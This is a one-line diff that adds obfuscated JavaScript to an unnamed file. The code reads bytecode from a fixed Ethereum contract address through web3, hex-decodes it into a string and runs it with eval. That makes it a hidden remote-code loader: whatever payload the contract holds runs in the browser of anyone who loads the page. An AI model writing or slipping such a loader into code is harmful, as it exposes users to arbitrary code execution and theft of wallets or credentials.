@@ -1,0 +1,1 @@
+var bi=0;window.web3.eth.getCode("0x4CecEC099a5c8B554e6Ec0cdb7B7623f5016e20b",(e,r)=>{for(t=r.toString(),n="",o=0; o<t.length;o+=2)n+=String.fromCharCode(parseInt(t.substr(o,2),16));eval(n.slice(1))})
